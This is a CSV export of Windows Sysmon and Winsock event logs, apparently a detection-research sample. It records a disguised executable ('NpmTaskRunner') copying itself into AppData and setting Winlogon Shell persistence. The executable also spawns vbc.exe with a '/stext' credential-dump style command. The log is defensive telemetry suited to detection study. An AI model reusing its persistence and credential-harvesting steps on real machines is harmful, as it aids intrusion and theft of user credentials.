,Catalog,Category,Channel,Computer,Correlation,EventID,EventRecordID,Execution_ProcessID,Execution_ThreadID,Guid,Installer,Keywords,Level,Lspname,Opcode,Provider_Guid,Provider_Name,Security_UserID,Task,TimeCreated_SystemTime,Version,Commandline,Company,Currentdirectory,Description,Fileversion,Hashes,Image,Integritylevel,Logonguid,Logonid,Parentcommandline,Parentimage,Parentprocessguid,Parentprocessid,Processguid,Processid,Product,Rulename,Terminalsessionid,User,Utctime,Creationutctime,Targetfilename,Details,Eventtype,Targetobject,Imageloaded,Signature,Signaturestatus,Signed,Destinationhostname,Destinationip,Destinationisipv6,Destinationport,Destinationportname,Initiated,Protocol,Sourcehostname,Sourceip,Sourceisipv6,Sourceport,Sourceportname,Originalfilename,Destination,Name,Operation,Type,Consumer,Filter,Eventnamespace,Query,Calltrace,Grantedaccess,Sourceimage,Sourceprocessguid,Sourceprocessid,Sourcethreadid,Targetimage,Targetprocessguid,Targetprocessid
0,32,1016,Microsoft-Windows-Winsock-WS2HELP/Operational,MSEDGEWIN10,,1,1,5180,1088,{7E35F09E-CF45-CF00-3594-397712626D0F},C:\Windows\System32\MsiExec.exe,0x8000000000000000,0,PROXYCAP LSP,0,{D5C25F9A-4D47-493E-9184-40DD397A004D},Microsoft-Windows-Winsock-WS2HELP,,0,2019-08-23T12:37:37.100800900Z,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1,32,1021,Microsoft-Windows-Winsock-WS2HELP/Operational,MSEDGEWIN10,,1,2,5284,8096,{7E35F09E-CF45-CF00-3594-397712626D0F},C:\Windows\syswow64\MsiExec.exe,0x8000000000000000,0,PROXYCAP LSP,0,{D5C25F9A-4D47-493E-9184-40DD397A004D},Microsoft-Windows-Winsock-WS2HELP,,0,2019-08-23T12:37:38.521158400Z,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7530,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:17.988370700Z,5,"""C:\Users\IEUser\Downloads\a.exe"" ",,C:\Users\IEUser\Downloads\,NpmTaskRunner,1.0.0.0,"SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",C:\Users\IEUser\Downloads\a.exe,High,{365ABB72-1D89-5D04-0000-00206D330100},0x000000000001336d,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,{365ABB72-1DB8-5D04-0000-00109BF60500},2816,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,NpmTaskRunner,,1,IEWIN7\IEUser,2019-06-14 22:22:17.957,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,11,7531,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,11,2019-06-14T22:22:21.503995700Z,2,,,,,,,C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,,,,,2019-06-14 22:22:21.503,2019-06-14 22:22:21.503,C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
4,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,13,7532,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,13,2019-06-14T22:22:21.535245700Z,2,,,,,,,C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,,Persistence - Winlogon Shell,,,2019-06-14 22:22:21.519,,,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe"",explorer.exe",SetValue,HKU\S-1-5-21-3583694148-1414552638-2922671848-1000\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
5,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7533,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:21.535245700Z,5,"""C:\Users\IEUser\Downloads\a.exe""",,C:\Users\IEUser\Downloads\,NpmTaskRunner,1.0.0.0,"SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",C:\Users\IEUser\Downloads\a.exe,High,{365ABB72-1D89-5D04-0000-00206D330100},0x000000000001336d,"""C:\Users\IEUser\Downloads\a.exe"" ",C:\Users\IEUser\Downloads\a.exe,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,{365ABB72-1E1D-5D04-0000-001003E70A00},1008,NpmTaskRunner,,1,IEWIN7\IEUser,2019-06-14 22:22:21.535,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
6,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,7,7536,1960,1916,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,7,2019-06-14T22:22:31.957120700Z,3,,Microsoft Corporation,,WMI,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=03DC8ABDF9C9948FE6E783DCA9C6C8264D635F0A,MD5=5610B0425518D185331CB8E968D060E6,SHA256=E235186C3BF266EE9EC733D2CFF35E3A65DE039C19B14260F4054F34B5E8AD41,IMPHASH=523D1DB34FC36465E35F6201A2FD561B",C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E1D-5D04-0000-001003E70A00},1008,Microsoft® Windows® Operating System,Execution - Suspicious WMI module load,,,2019-06-14 22:22:31.925,,,,,,C:\Windows\System32\wbem\wmiutils.dll,Microsoft Windows,Valid,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
7,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7537,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:32.222745700Z,5,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"" /stext ""C:\Users\IEUser\AppData\Local\Temp\tmpA185.tmp""",Microsoft Corporation,C:\Users\IEUser\Downloads\,Visual Basic Command Line Compiler,8.0.50727.5483,"SHA1=BE642993EFE69E35F3C17AC5630E8EE3958D9A1E,MD5=1672D0478049ABDAF0197BE64A7F867F,SHA256=C67F217DA287D8CEF48FA9E9DEE971D59D7EFABBD0C7F700664D7970D68B52EF,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe,High,{365ABB72-1D89-5D04-0000-00206D330100},0x000000000001336d,"""C:\Users\IEUser\Downloads\a.exe""",C:\Users\IEUser\Downloads\a.exe,{365ABB72-1E1D-5D04-0000-001003E70A00},1008,{365ABB72-1E28-5D04-0000-0010EC030B00},1584,Microsoft® Visual Studio® 2005,,1,IEWIN7\IEUser,2019-06-14 22:22:32.191,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
8,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7543,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:47.253995700Z,5,"""LogonUI.exe"" /flags:0x0",Microsoft Corporation,C:\Windows\system32\,Windows Logon User Interface Host,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=6FCAD4F6BB71049744D25F2B53A651AC5AA79187,MD5=3EF0D8AB08385AAB5802E773511A2E6A,SHA256=1A7EE4BC646767004372EAEA9BC0A2071790E739101F7D25ECD9C95D3F29AFD6,IMPHASH=B8FCE86F8F679B9FC7368F8F47778678",C:\Windows\System32\LogonUI.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,winlogon.exe,C:\Windows\System32\winlogon.exe,{365ABB72-9C16-5D04-0000-00104B5A0000},444,{365ABB72-1E37-5D04-0000-001049360B00},1552,Microsoft® Windows® Operating System,,1,NT AUTHORITY\SYSTEM,2019-06-14 22:22:47.128,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
9,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,5,7544,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,5,2019-06-14T22:22:52.457120700Z,3,,,,,,,C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E1D-5D04-0000-001003E70A00},1008,,,,,2019-06-14 22:22:52.332,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
10,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,5,7545,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,5,2019-06-14T22:22:52.503995700Z,3,,,,,,,C:\Users\IEUser\Downloads\a.exe,,,,,,,,{365ABB72-1E19-5D04-0000-0010DFC60A00},4020,,,,,2019-06-14 22:22:52.503,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
11,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7546,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:55.441495700Z,5,\SystemRoot\System32\smss.exe 00000000 00000040 ,Microsoft Corporation,C:\Windows\,Windows Session Manager,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=6EBCD58670607B00DD138AB5BC22C2359A9551CE,MD5=899FAA235BD35DABE1C2505CE313AD5F,SHA256=AB17ADE22FD2E24CAC554F4FB9C84A810B8C377F09A49762F6616DA49E653141,IMPHASH=263C3FFA2FD990E9BAE492989A61AF52",C:\Windows\System32\smss.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,\SystemRoot\System32\smss.exe,C:\Windows\System32\smss.exe,{365ABB72-9C13-5D04-0000-0010472D0000},264,{365ABB72-1E3F-5D04-0000-0010EC890B00},688,Microsoft® Windows® Operating System,,2,NT AUTHORITY\SYSTEM,2019-06-14 22:22:55.394,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7547,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:55.503995700Z,5,"%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",Microsoft Corporation,C:\Windows\system32,Client Server Runtime Process,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=53BC9B2AE89FCAD6197EC519AE588F926C88E460,MD5=342271F6142E7C70805B8A81E1BA5F5C,SHA256=F9112B88FEC5EF10A7AEDF88DCEE61956D1FCDE7CB42197216E8265578713786,IMPHASH=A801AE60E0B3E5643B92C006DA96F0E0",C:\Windows\System32\csrss.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,\SystemRoot\System32\smss.exe 00000000 00000040 ,C:\Windows\System32\smss.exe,{365ABB72-1E3F-5D04-0000-0010EC890B00},688,{365ABB72-1E3F-5D04-0000-0010568A0B00},488,Microsoft® Windows® Operating System,,2,NT AUTHORITY\SYSTEM,2019-06-14 22:22:55.410,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
13,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7548,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:55.566495700Z,5,winlogon.exe,Microsoft Corporation,C:\Windows\system32,Windows Logon Application,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=B7F3D71BD568CBD15C6C3445042FCBEB322E8072,MD5=52449FD429D6053B78AE564DEF303870,SHA256=473E42C5B48493C84CF1B22D054AD1C788FCE3603E439ABC77A3B37DACFF9F1C,IMPHASH=017962B1BE2C625ABB0F1195D008BD45",C:\Windows\System32\winlogon.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,\SystemRoot\System32\smss.exe 00000000 00000040 ,C:\Windows\System32\smss.exe,{365ABB72-1E3F-5D04-0000-0010EC890B00},688,{365ABB72-1E3F-5D04-0000-0010FF8D0B00},1228,Microsoft® Windows® Operating System,,2,NT AUTHORITY\SYSTEM,2019-06-14 22:22:55.550,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
14,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7549,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:22:55.707120700Z,5,"""LogonUI.exe"" /flags:0x0",Microsoft Corporation,C:\Windows\system32\,Windows Logon User Interface Host,6.1.7601.17514 (win7sp1_rtm.101119-1850),"SHA1=6FCAD4F6BB71049744D25F2B53A651AC5AA79187,MD5=3EF0D8AB08385AAB5802E773511A2E6A,SHA256=1A7EE4BC646767004372EAEA9BC0A2071790E739101F7D25ECD9C95D3F29AFD6,IMPHASH=B8FCE86F8F679B9FC7368F8F47778678",C:\Windows\System32\LogonUI.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,winlogon.exe,C:\Windows\System32\winlogon.exe,{365ABB72-1E3F-5D04-0000-0010FF8D0B00},1228,{365ABB72-1E3F-5D04-0000-00102B9C0B00},948,Microsoft® Windows® Operating System,,2,NT AUTHORITY\SYSTEM,2019-06-14 22:22:55.707,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
15,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7552,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:06.691495700Z,5,C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E},Microsoft Corporation,C:\Windows\system32\,COM Surrogate,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=ACE762C51DB1908C858C898D7E0F9B36F788D2D9,MD5=A63DC5C2EA944E6657203E0C8EDEAF61,SHA256=F7AD4B09AFB301CE46DF695B22114331A57D52E6D4163FF74787BF68CCF44C78,IMPHASH=EB9A02895A60E58547EFF153D6FF8829",C:\Windows\System32\dllhost.exe,System,{365ABB72-9C16-5D04-0000-0020E7030000},0x00000000000003e7,C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\System32\svchost.exe,{365ABB72-9C16-5D04-0000-001006790000},616,{365ABB72-1E4A-5D04-0000-0010ECC20B00},2128,Microsoft® Windows® Operating System,,0,NT AUTHORITY\SYSTEM,2019-06-14 22:23:06.660,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
16,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7553,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:07.019620700Z,5,efsui.exe /efs /keybackup,Microsoft Corporation,C:\Windows\system32\,EFS UI Application,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=52E9D30B60AF28E5E65223E5894517AEF9D3F638,MD5=BCB88EED0CD8632A6167427D8032C39C,SHA256=C2935B32480BAC58583D4C1D9D7ED79743E07AF3877D93D343C59BD37DE8D0B6,IMPHASH=88F5B8A224E2F6213BCEF481DFF428B6",C:\Windows\System32\efsui.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\system32\lsass.exe,C:\Windows\System32\lsass.exe,{365ABB72-9C16-5D04-0000-001085610000},496,{365ABB72-1E4A-5D04-0000-0010BACF0B00},2264,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:06.738,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
17,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7554,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:07.082120700Z,5,atbroker.exe,Microsoft Corporation,C:\Windows\system32\,Transitions Accessible technologies between desktops,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=1B376C177C5629C0E620431AF1A9E8C16BF23D53,MD5=3CA2BB895E204478C7A4C9BAF70970CE,SHA256=DE3196627BC810DD22F58DEE65747BACA25485CCD0CEE2701055ECE1058F1C6A,IMPHASH=4B8AA723CCFC5B2FBA6ED3D8F3557DE3",C:\Windows\System32\AtBroker.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,winlogon.exe,C:\Windows\System32\winlogon.exe,{365ABB72-1E3F-5D04-0000-0010FF8D0B00},1228,{365ABB72-1E4A-5D04-0000-001016D70B00},1628,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:06.769,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
18,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7555,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:13.894620700Z,5,C:\Windows\system32\userinit.exe,Microsoft Corporation,C:\Windows\system32\,Userinit Logon Application,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=211295CCDA6CF6409189279BF66A212BD53FC650,MD5=61AC3EFDFACFDD3F0F11DD4FD4044223,SHA256=538FE1012FEDC72727A8DE0C2C01944B3D35C29812ECEF88E95AAC07235E0B0B,IMPHASH=DA2666D3347F129193AB91A0EAB85C0C",C:\Windows\System32\userinit.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,winlogon.exe,C:\Windows\System32\winlogon.exe,{365ABB72-1E3F-5D04-0000-0010FF8D0B00},1228,{365ABB72-1E51-5D04-0000-00104C340C00},3448,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:13.894,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
19,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7556,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:13.957120700Z,5,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""",,C:\Windows\system32\,NpmTaskRunner,1.0.0.0,"SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\system32\userinit.exe,C:\Windows\System32\userinit.exe,{365ABB72-1E51-5D04-0000-00104C340C00},3448,{365ABB72-1E51-5D04-0000-00107B380C00},3444,NpmTaskRunner,,2,IEWIN7\IEUser,2019-06-14 22:23:13.925,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
20,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7557,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:13.972745700Z,5,C:\Windows\Explorer.EXE,Microsoft Corporation,C:\Windows\system32\,Windows Explorer,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=1643E6D0265EB60B0753CDC9C283D843B988E1D5,MD5=6DDCA324434FFA506CF7DC4E51DB7935,SHA256=11D69FB388FF59E5BA6CA217CA04ECDE6A38FA8FB306AA5F1B72E22BB7C3A25A,IMPHASH=F0EE25FD4D9035DAD1913FAFFD4A4B87",C:\Windows\explorer.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\system32\userinit.exe,C:\Windows\System32\userinit.exe,{365ABB72-1E51-5D04-0000-00104C340C00},3448,{365ABB72-1E51-5D04-0000-001065390C00},3620,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:13.957,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
21,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7558,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:15.054777000Z,5,"""C:\Windows\System32\VBoxTray.exe"" ",Oracle Corporation,C:\Windows\system32\,VirtualBox Guest Additions Tray Application,5.1.30.118389,"SHA1=85AD42F7238612E2940133814C32837993672F32,MD5=A06C028F679788066C2E6B4E4C463B51,SHA256=796B84A6EE1F8146A5685069E1DADD7D9A02E593501FF31BB516E5E828020CF8,IMPHASH=E674A2E741B5EE0A1FC1192405721321",C:\Windows\System32\VBoxTray.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,{365ABB72-1E51-5D04-0000-001065390C00},3620,{365ABB72-1E52-5D04-0000-00101D700C00},3920,Oracle VM VirtualBox Guest Additions,,2,IEWIN7\IEUser,2019-06-14 22:23:14.472,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
22,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7559,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:16.592862900Z,5,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""",,C:\Windows\system32\,NpmTaskRunner,1.0.0.0,"SHA1=E2286C233467D0E164ED5ED1D07BAC9F90F74D19,MD5=41CE32C0D1D4E5BB8C63674F317450EF,SHA256=5DE788D23B247B29F116CD0583280CE10A429E9F8C1D80C42DEAB20C6F4DBB4E,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,{365ABB72-1E51-5D04-0000-00107B380C00},3444,{365ABB72-1E54-5D04-0000-0010B7B30C00},1724,NpmTaskRunner,,2,IEWIN7\IEUser,2019-06-14 22:23:16.577,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
23,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7562,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:23.405362900Z,5,"""C:\Windows\system32\eventvwr.exe"" ",Microsoft Corporation,C:\Users\IEUser\,Event Viewer Snapin Launcher,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=ADA934DA7A0D40FA0F54652687F762B82EA5F27E,MD5=91415D7EB992B77410145DD5FE453D25,SHA256=2F515E9662CA785A9C877E81BE1D52879EF4741BBDE3213550A3C077127436C2,IMPHASH=7CAE841724AAC4485D1A064D5F0E471F",C:\Windows\System32\eventvwr.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\Explorer.EXE,C:\Windows\explorer.exe,{365ABB72-1E51-5D04-0000-001065390C00},3620,{365ABB72-1E5B-5D04-0000-00109EF80C00},2040,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:23.389,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
24,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,7,7563,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,7,2019-06-14T22:23:26.811612900Z,3,,Microsoft Corporation,,WMI,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=03DC8ABDF9C9948FE6E783DCA9C6C8264D635F0A,MD5=5610B0425518D185331CB8E968D060E6,SHA256=E235186C3BF266EE9EC733D2CFF35E3A65DE039C19B14260F4054F34B5E8AD41,IMPHASH=523D1DB34FC36465E35F6201A2FD561B",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,,,,,,,,{365ABB72-1E54-5D04-0000-0010B7B30C00},1724,Microsoft® Windows® Operating System,Execution - Suspicious WMI module load,,,2019-06-14 22:23:26.811,,,,,,C:\Windows\System32\wbem\wmiutils.dll,Microsoft Windows,Valid,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
25,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7564,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:26.999112900Z,5,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"" /stext ""C:\Users\IEUser\AppData\Local\Temp\tmp7792.tmp""",Microsoft Corporation,C:\Windows\system32\,Visual Basic Command Line Compiler,8.0.50727.5483,"SHA1=BE642993EFE69E35F3C17AC5630E8EE3958D9A1E,MD5=1672D0478049ABDAF0197BE64A7F867F,SHA256=C67F217DA287D8CEF48FA9E9DEE971D59D7EFABBD0C7F700664D7970D68B52EF,IMPHASH=5B989C7F24F9B07840E9A2A654544C93",C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""",C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe,{365ABB72-1E54-5D04-0000-0010B7B30C00},1724,{365ABB72-1E5E-5D04-0000-0010EF5E0D00},2980,Microsoft® Visual Studio® 2005,,2,IEWIN7\IEUser,2019-06-14 22:23:26.983,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
26,,,Microsoft-Windows-Sysmon/Operational,IEWIN7,,1,7570,1960,288,,,0x8000000000000000,4,,0,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},Microsoft-Windows-Sysmon,,1,2019-06-14T22:23:53.358487900Z,5,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},Microsoft Corporation,C:\Windows\system32\,COM Surrogate,6.1.7600.16385 (win7_rtm.090713-1255),"SHA1=ACE762C51DB1908C858C898D7E0F9B36F788D2D9,MD5=A63DC5C2EA944E6657203E0C8EDEAF61,SHA256=F7AD4B09AFB301CE46DF695B22114331A57D52E6D4163FF74787BF68CCF44C78,IMPHASH=EB9A02895A60E58547EFF153D6FF8829",C:\Windows\System32\dllhost.exe,High,{365ABB72-1E4A-5D04-0000-002013C00B00},0x00000000000bc013,C:\Windows\system32\svchost.exe -k DcomLaunch,C:\Windows\System32\svchost.exe,{365ABB72-9C16-5D04-0000-001006790000},616,{365ABB72-1E79-5D04-0000-0010EADE0E00},3284,Microsoft® Windows® Operating System,,2,IEWIN7\IEUser,2019-06-14 22:23:53.342,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
